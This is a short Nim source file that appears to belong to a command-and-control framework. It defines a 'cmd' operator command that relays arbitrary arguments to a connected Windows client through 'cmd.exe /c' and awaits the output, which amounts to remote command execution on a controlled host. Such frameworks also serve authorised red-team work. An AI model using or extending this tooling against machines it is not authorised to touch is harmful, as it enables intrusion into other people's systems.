import asyncdispatch, strutils

import ../../types
import ../../communication

import ../../../clientTasks/shell

proc execProc(args: seq[string], server: C2Server) {.async.} =
  let argsn = len(args)
  let task = await shell.sendTask(server.cli.handlingClient, "cmd.exe /c " & args[1..(argsn - 1)].join(" "))
  await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "cmd",
  argsLength: 2,
  usage: @["cmd [command]"],
  cliMode: @[ClientInteractMode],
  description: "Run a command via cmd.exe (Windows only)",
  category: CCClientInteraction,
  requiresConnectedClient: true
)